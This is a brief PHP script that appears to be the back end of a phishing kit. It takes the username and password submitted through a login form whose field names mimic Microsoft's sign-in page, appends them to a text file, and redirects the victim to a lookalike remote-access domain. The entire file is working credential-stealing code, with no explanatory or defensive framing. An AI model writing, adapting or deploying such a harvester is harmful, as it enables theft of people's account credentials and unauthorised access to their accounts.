<?php

file_put_contents("usernames.txt", "Username: " . $_POST['loginfmt'] . " Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://remote.warbrugpincus.tom');
exit();
?>